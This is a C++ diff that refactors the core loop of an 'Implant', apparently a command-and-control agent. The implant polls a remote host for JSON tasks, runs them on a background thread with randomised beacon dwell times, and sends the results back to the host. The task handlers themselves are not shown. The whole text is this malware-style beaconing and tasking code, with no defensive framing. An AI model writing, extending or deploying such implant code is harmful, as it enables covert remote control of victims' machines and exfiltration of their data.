@@ -25,7 +25,7 @@
                     "Host: "
                  << host
                  << "\r\n"
-                    "Accept: text/html\r\n"
+                    "Accept: application/json\r\n"
                     "Accept-Language: en-us\r\n"
                     "Accept-Encoding: identity\r\n"
                     "Connection: close\r\n"
@@ -50,7 +50,8 @@
 Implant::Implant(std::string host, std::string service,
                  boost::asio::io_context &io_context)
     : host{std::move(host)}, service{std::move(service)},
-      io_context{io_context}, is_running(true), dwell_distribution_seconds{1.} {
+      io_context{io_context}, is_running(true), dwell_distribution_seconds{1.},
+      task_thread{std::async(std::launch::async, [this]{ service_tasks(); })} {
 }
 
 void Implant::serve() {
@@ -72,23 +73,29 @@ void Implant::serve() {
 }
 
 [[nodiscard]] std::string Implant::send_results() {
+  boost::property_tree::ptree results_local;
+  {
+    std::scoped_lock<std::mutex> results_lock{results_mutex};
+    results_local.swap(results);
+  }
   std::stringstream results_ss;
-  boost::property_tree::write_json(results_ss, results);
-  const auto response =
-      make_request(host, service, results_ss.str(), io_context);
-  results.clear();
-  return response;
+  boost::property_tree::write_json(results_ss, results_local);
+  return make_request(host, service, results_ss.str(), io_context);
 }
 void Implant::parse_tasks(const std::string &response) {
   std::stringstream response_ss{response};
-  boost::property_tree::ptree tasks;
-  boost::property_tree::read_json(response_ss, tasks);
-  for (const auto &[task_tree_key, task_tree_value] : tasks) {
-    const auto task = parse_task_from(task_tree_value, *this);
-    const auto [id, contents, success] =
-        std::visit([](const auto &task) { return task.run(); }, task);
-    results.add(boost::uuids::to_string(id) + ".contents", contents);
-    results.add(boost::uuids::to_string(id) + ".success", success);
+  boost::property_tree::ptree tasks_ptree;
+  boost::property_tree::read_json(response_ss, tasks_ptree);
+  for (const auto &[task_tree_key, task_tree_value] : tasks_ptree) {
+    {
+      std::scoped_lock<std::mutex> task_lock{task_mutex};
+      tasks.push_back(
+          parse_task_from(task_tree_value, [this](const auto& configuration){
+            set_mean_dwell(configuration.mean_dwell);
+            set_running(configuration.is_running);
+          })
+        );
+    }
   }
 }
 void Implant::set_mean_dwell(double mean_dwell) {
@@ -96,3 +103,20 @@ void Implant::set_mean_dwell(double mean_dwell) {
       std::exponential_distribution<double>(1. / mean_dwell);
 }
 void Implant::set_running(bool is_running_in) { is_running = is_running_in; }
+void Implant::service_tasks() {
+  while(is_running){
+    std::vector<Task> local_tasks;
+    {
+      std::scoped_lock<std::mutex> task_lock{task_mutex};
+      tasks.swap(local_tasks);
+    }
+    for(const auto& task : local_tasks) {
+      const auto [id, contents, success] = std::visit([](const auto &task) { return task.run(); }, task);
+      {
+        std::scoped_lock<std::mutex> results_lock{results_mutex};
+        results.add(boost::uuids::to_string(id) + ".contents", contents);
+        results.add(boost::uuids::to_string(id) + ".success", success);
+      }
+    }
+  }
+}
